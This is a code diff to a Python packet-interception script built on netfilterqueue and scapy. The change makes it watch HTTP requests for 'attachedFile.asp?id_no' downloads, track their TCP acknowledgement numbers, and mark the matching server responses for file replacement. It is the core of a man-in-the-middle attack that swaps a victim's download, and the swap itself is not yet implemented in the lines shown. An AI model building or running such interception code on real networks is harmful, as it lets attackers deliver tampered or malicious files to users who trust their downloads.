@@ -2,6 +2,9 @@ import netfilterqueue
 import scapy.all as scapy
 
 
+ack_list = []
+
+
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     '''
@@ -12,15 +15,15 @@ def process_packet(packet):
     '''
     if scapy_packet.haslayer(scapy.Raw):
         if scapy_packet[scapy.TCP].dport == 80:
-            print("HTTP Request")
-            # print(scapy_packet.show())
-            print(str(scapy_packet[scapy.Raw].load))
-            if ".docx" in str(scapy_packet[scapy.Raw].load):
-                print("[+] docx Request")
+            if "attachedFile.asp?id_no" in str(scapy_packet[scapy.Raw].load):
+                print("[+] File Request")
+                ack_list.append(scapy_packet[scapy.TCP].ack)
                 print(scapy_packet.show())
         elif scapy_packet[scapy.TCP].sport == 80:
-            print("HTTP Respose")
-            # print(scapy_packet.show())
+            if scapy_packet[scapy.TCP].seq in ack_list:
+                ack_list.remove(scapy_packet[scapy.TCP].seq)
+                print("[+] Replacing file")
+                print(scapy_packet.show())
     packet.accept()
 
 
